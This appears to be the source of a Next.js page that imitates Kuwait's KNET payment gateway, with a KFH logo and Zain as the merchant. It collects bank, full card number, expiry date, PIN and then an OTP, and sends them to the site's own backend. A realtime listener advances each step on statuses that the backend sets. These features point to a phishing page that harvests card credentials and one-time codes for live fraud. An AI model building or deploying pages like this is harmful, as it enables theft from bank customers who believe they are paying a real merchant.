"use client"

import type React from "react"

import { useEffect, useState, Suspense } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { createBrowserClient } from "@/lib/supabase/client"
import "../responsive.css"

const BANKS = [
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160"],
  },
  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "5326674", "450778"],
  },
  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
  },
  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
  },
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056", "588790"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778"],
  },
  {
    value: "TAM",
    label: "TAM Bank",
    cardPrefixes: ["45077848", "45077849"],
  },
  {
    value: "Weyay",
    label: "Weyay Bank",
    cardPrefixes: ["46445250", "543363"],
  },
]

type PaymentInfo = {
  bank: string
  cardPrefix: string
  cardNumber: string
  month: string
  year: string
  pin: string
  otp: string
  status: "new" | "pending" | "otp_required" | "approved" | "rejected"
}

function KnetPaymentContent() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const [step, setStep] = useState(1)
  const [total, setTotal] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [transactionId, setTransactionId] = useState("")
  const [countdown, setCountdown] = useState(60)
  const [isCountdownActive, setIsCountdownActive] = useState(false)
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    bank: "",
    cardPrefix: "",
    cardNumber: "",
    month: "",
    year: "",
    pin: "",
    otp: "",
    status: "new",
  })
  const [selectedBankPrefixes, setSelectedBankPrefixes] = useState<string[]>([])
  const [errorMessage, setErrorMessage] = useState("")

  const supabase = createBrowserClient()

  useEffect(() => {
    const amount = searchParams.get("amount")
    const txnId = searchParams.get("txn")

    if (amount) {
      setTotal(amount)
    }
    if (txnId) {
      setTransactionId(txnId)
    }
  }, [searchParams])

  useEffect(() => {
    if (!transactionId) return

    const channel = supabase
      .channel(`payment-${transactionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "transactions",
          filter: `transaction_id=eq.${transactionId}`,
        },
        (payload) => {
          const status = payload.new.status
          console.log("[v0] Payment status update:", status)

          if (status === "otp_required") {
            setIsLoading(false)
            setStep(2)
            setIsCountdownActive(true)
            setCountdown(60)
          } else if (status === "completed") {
            setIsLoading(false)
            router.push(`/payment/success?txn=${transactionId}`)
          } else if (status === "failed" || status === "rejected") {
            setIsLoading(false)
            setErrorMessage("Payment was rejected. Please try again.")
            setStep(1)
          }
        },
      )
      .subscribe()

    return () => {
      supabase.removeChannel(channel)
    }
  }, [transactionId, router, supabase])

  useEffect(() => {
    let interval: NodeJS.Timeout | null = null

    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => {
        setCountdown((prev) => prev - 1)
      }, 1000)
    } else if (countdown === 0) {
      setIsCountdownActive(false)
    }

    return () => {
      if (interval) clearInterval(interval)
    }
  }, [isCountdownActive, countdown])

  const handleBankSelect = (bankValue: string) => {
    const selectedBank = BANKS.find((bank) => bank.value === bankValue)
    setPaymentInfo({
      ...paymentInfo,
      bank: bankValue,
    })
    setSelectedBankPrefixes(selectedBank ? selectedBank.cardPrefixes : [])
  }

  const handleSubmitCardDetails = async (e: React.FormEvent) => {
    e.preventDefault()
    setErrorMessage("")

    // Validation
    if (!paymentInfo.bank) {
      setErrorMessage("Please select your bank")
      return
    }
    if (!paymentInfo.cardPrefix) {
      setErrorMessage("Please select card prefix")
      return
    }
    if (paymentInfo.cardNumber.length !== 10) {
      setErrorMessage("Card number must be 10 digits")
      return
    }
    if (!paymentInfo.month || !paymentInfo.year) {
      setErrorMessage("Please select expiration date")
      return
    }
    if (paymentInfo.pin.length !== 4) {
      setErrorMessage("PIN must be 4 digits")
      return
    }

    setIsLoading(true)

    try {
      const response = await fetch("/api/knet/process-card", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          transactionId,
          cardDetails: {
            bank: paymentInfo.bank,
            cardNumber: paymentInfo.cardPrefix + paymentInfo.cardNumber,
            expiryMonth: paymentInfo.month,
            expiryYear: paymentInfo.year,
            pin: paymentInfo.pin,
          },
        }),
      })

      const data = await response.json()

      if (data.success) {
        // Backend will update status to otp_required, listener will handle UI update
        console.log("[v0] Card details submitted successfully")
      } else {
        setIsLoading(false)
        setErrorMessage(data.error || "Failed to process card details")
      }
    } catch (error) {
      setIsLoading(false)
      setErrorMessage("An error occurred. Please try again.")
      console.error("[v0] Card submission error:", error)
    }
  }

  const handleSubmitOTP = async (e: React.FormEvent) => {
    e.preventDefault()
    setErrorMessage("")

    if (paymentInfo.otp.length !== 6) {
      setErrorMessage("OTP must be 6 digits")
      return
    }

    setIsLoading(true)

    try {
      const response = await fetch("/api/knet/verify-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          transactionId,
          otp: paymentInfo.otp,
        }),
      })

      const data = await response.json()

      if (data.success) {
        // Backend will update status, listener will handle redirect
        console.log("[v0] OTP submitted successfully")
      } else {
        setIsLoading(false)
        setErrorMessage(data.error || "Invalid OTP")
      }
    } catch (error) {
      setIsLoading(false)
      setErrorMessage("An error occurred. Please try again.")
      console.error("[v0] OTP submission error:", error)
    }
  }

  const handleResendOTP = async () => {
    setErrorMessage("")
    setCountdown(60)
    setIsCountdownActive(true)

    try {
      await fetch("/api/knet/resend-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ transactionId }),
      })
    } catch (error) {
      console.error("[v0] Resend OTP error:", error)
    }
  }

  return (
    <div style={{ background: "#f1f1f1", minHeight: "100vh" }} dir="ltr">
      <form onSubmit={step === 1 ? handleSubmitCardDetails : handleSubmitOTP}>
        <div id="PayPageEntry">
          <div className="container">
            <div style={{ display: "flex", justifyContent: "center", padding: "20px 0" }}>
              <img src="/kfh-logo.png" alt="KNET" height={80} width={200} style={{ objectFit: "contain" }} />
            </div>

            <div className="content-block">
              <div className="form-card">
                <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
                  <img src="/images/myzain.png" alt="Zain" height={60} />
                </div>
                <div className="row">
                  <label className="column-label">Merchant:</label>
                  <label className="column-value text-label">Mobile Telecommunication Co.</label>
                </div>
                <div className="row">
                  <label className="column-label">Amount:</label>
                  <label className="column-value text-label">{total} KD</label>
                </div>
              </div>

              {errorMessage && (
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    color: "#ff0000",
                  }}
                >
                  {errorMessage}
                </div>
              )}

              <div className="form-card">
                {step === 1 ? (
                  <>
                    <div className="row">
                      <label className="column-label">Select Your Bank:</label>
                      <select
                        className="column-value"
                        value={paymentInfo.bank}
                        onChange={(e) => handleBankSelect(e.target.value)}
                        required
                      >
                        <option value="">Select Your Bank</option>
                        {BANKS.map((bank) => (
                          <option key={bank.value} value={bank.value}>
                            {bank.label} [{bank.value}]
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="row three-column">
                      <label className="column-label">Card Number:</label>
                      <select
                        className="column-value"
                        style={{ width: "30%" }}
                        value={paymentInfo.cardPrefix}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, cardPrefix: e.target.value })}
                        required
                      >
                        <option value="">Prefix</option>
                        {selectedBankPrefixes.map((prefix) => (
                          <option key={prefix} value={prefix}>
                            {prefix}
                          </option>
                        ))}
                      </select>
                      <input
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        maxLength={10}
                        style={{ width: "65%" }}
                        value={paymentInfo.cardNumber}
                        onChange={(e) =>
                          setPaymentInfo({
                            ...paymentInfo,
                            cardNumber: e.target.value.replace(/\D/g, ""),
                          })
                        }
                        placeholder="Enter 10 digits"
                        required
                      />
                    </div>

                    <div className="row three-column">
                      <label className="column-label">Expiration Date:</label>
                      <select
                        className="column-value"
                        value={paymentInfo.month}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
                        required
                      >
                        <option value="">MM</option>
                        {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                          <option key={month} value={month}>
                            {month.toString().padStart(2, "0")}
                          </option>
                        ))}
                      </select>
                      <select
                        className="column-long"
                        value={paymentInfo.year}
                        onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
                        required
                      >
                        <option value="">YYYY</option>
                        {Array.from({ length: 20 }, (_, i) => 2024 + i).map((year) => (
                          <option key={year} value={year}>
                            {year}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="row">
                      <label className="column-label">PIN:</label>
                      <input
                        type="password"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        maxLength={4}
                        style={{ width: "60%" }}
                        value={paymentInfo.pin}
                        onChange={(e) =>
                          setPaymentInfo({
                            ...paymentInfo,
                            pin: e.target.value.replace(/\D/g, ""),
                          })
                        }
                        placeholder="4-digit PIN"
                        required
                      />
                    </div>

                    <button type="submit" disabled={isLoading}>
                      {isLoading ? "Processing..." : "Continue"}
                    </button>
                  </>
                ) : (
                  <>
                    <div className="row">
                      <label className="column-label">Enter OTP:</label>
                      <input
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        maxLength={6}
                        style={{ width: "60%" }}
                        value={paymentInfo.otp}
                        onChange={(e) =>
                          setPaymentInfo({
                            ...paymentInfo,
                            otp: e.target.value.replace(/\D/g, ""),
                          })
                        }
                        placeholder="6-digit OTP"
                        required
                      />
                    </div>

                    <div className="row" style={{ justifyContent: "center" }}>
                      <p style={{ fontSize: 14, color: "#666" }}>
                        {isCountdownActive ? `Resend OTP in ${countdown}s` : "Didn't receive OTP?"}
                      </p>
                      {!isCountdownActive && (
                        <button
                          type="button"
                          onClick={handleResendOTP}
                          style={{
                            width: "auto",
                            padding: "8px 16px",
                            marginLeft: 10,
                            backgroundColor: "#6c757d",
                          }}
                        >
                          Resend OTP
                        </button>
                      )}
                    </div>

                    <button type="submit" disabled={isLoading}>
                      {isLoading ? "Verifying..." : "Confirm Payment"}
                    </button>
                  </>
                )}

                <button
                  type="button"
                  onClick={() => router.back()}
                  style={{
                    backgroundColor: "#6c757d",
                    marginTop: 10,
                  }}
                  disabled={isLoading}
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  )
}

export default function KnetPaymentPage() {
  return (
    <Suspense fallback={<div style={{ padding: 20, textAlign: "center" }}>Loading payment...</div>}>
      <KnetPaymentContent />
    </Suspense>
  )
}
